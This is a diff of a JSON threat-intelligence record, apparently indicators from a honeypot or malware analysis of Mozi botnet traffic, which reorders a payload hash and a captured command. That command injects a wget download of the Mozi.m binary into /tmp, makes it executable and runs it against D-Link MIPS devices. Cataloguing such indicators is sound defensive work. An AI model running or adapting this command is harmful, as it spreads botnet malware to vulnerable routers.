@@ -6,16 +6,16 @@
     "value": "hxxp://%s:%d/Mozi.m%20-O%20-"
   },
   {
-    "context": "Inbound payload hash (unknown)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "4094d7ce7869e0147731aa495779b115a4536772ccae4445d78994b6147968fb"
-  },
-  {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "4094d7ce7869e0147731aa495779b115a4536772ccae4445d78994b6147968fb"
   },
   {
     "asn": "Nasstec Airnet Networks Private Limited",
